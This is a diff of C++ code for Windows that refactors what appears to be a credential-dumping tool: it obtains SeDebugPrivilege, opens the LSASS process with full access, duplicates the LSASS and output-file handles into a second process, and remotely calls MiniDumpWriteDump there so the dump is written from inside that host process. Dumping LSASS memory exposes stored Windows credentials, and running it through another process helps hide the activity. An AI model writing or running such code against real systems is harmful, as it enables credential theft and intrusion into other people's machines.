@@ -46,36 +46,29 @@ int main(int argc, char **argv)
             if(givePrivs(dwPid) && givePrivs(GetCurrentProcessId()))
             {
                 HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, false, dwLsass);
-                if(hLsass)
+                uintptr_t remoteHand = dupHandle(dwPid, hLsass);
+                uintptr_t remoteFil = dupHandle(dwPid, hFile);
+                if(remoteHand && remoteFil)
                 {
-                    HANDLE hPid = OpenProcess(PROCESS_ALL_ACCESS, false, dwPid);
-                    if(hPid)
+                    uintptr_t GLEval = 0;
+                    uintptr_t retval = copyAndExecWithParams(dwPid, loadDlls, &GLEval, {});
+                    cout << (hex) << "LoadDLLs() = 0x" << retval << ". GLE = 0x" << GLEval << endl;
+                    if(retval)
                     {
-                        uintptr_t remoteHand = 0;
-                        uintptr_t remoteFil = 0;
-                        DuplicateHandle(GetCurrentProcess(), hLsass, hPid, (LPHANDLE) &remoteHand, 0, false, DUPLICATE_SAME_ACCESS);
-                        DuplicateHandle(GetCurrentProcess(), hFile, hPid, (LPHANDLE) &remoteFil, 0, false, DUPLICATE_SAME_ACCESS);
-                        uintptr_t GLEval = 0;
-                        uintptr_t retval = copyAndExecWithParams(dwPid, loadDlls, &GLEval, {});
-                        cout << (hex) << "LoadDLLs() = 0x" << retval << ". GLE = 0x" << GLEval << endl;
-                        if(retval)
+                        retval = execWithParams(dwPid, miniDumpWriteDump, &GLEval, {remoteHand, (uintptr_t) dwLsass, remoteFil, 2, 0, 0, 0});
+                        cout << (hex) << "MiniDumpWriteDump() = 0x" << retval << ". GLE = 0x" << GLEval << endl;
+                        while(true)
                         {
-                            retval = execWithParams(dwPid, miniDumpWriteDump, &GLEval, {remoteHand, (uintptr_t) dwLsass, remoteFil, 2, 0, 0, 0});
-                            cout << (hex) << "MiniDumpWriteDump() = 0x" << retval << ". GLE = 0x" << GLEval << endl;
-                            while(true)
-                            {
-                                cout << "Waiting for the file handle to close..." << endl;
-                                uintptr_t closeHandle = (uintptr_t) GetProcAddress(LoadLibrary("kernel32.dll"), "CloseHandle");
-                                retval = execWithParams(dwPid, closeHandle, &GLEval, {remoteFil});
-                                if(retval) break;
-                                Sleep(1000);
-                            }
-                            cout << "Your dump should be in " << argv[3] << endl;
+                            cout << "Waiting for the file handle to close..." << endl;
+                            uintptr_t closeHandle = (uintptr_t) GetProcAddress(LoadLibrary("kernel32.dll"), "CloseHandle");
+                            retval = execWithParams(dwPid, closeHandle, &GLEval, {remoteFil});
+                            if(retval) break;
+                            Sleep(1000);
                         }
-                   }
-                    debugcry("OpenProcess (host)");
+                        cout << "Your dump should be in " << argv[3] << endl;
+                    }
                 }
-                debugcry("OpenProcess (to dump)");
+                debugcry("dupHandle");
             }
             else cout << "Could not get SeDebugPrivilege for processes." << endl;
         }
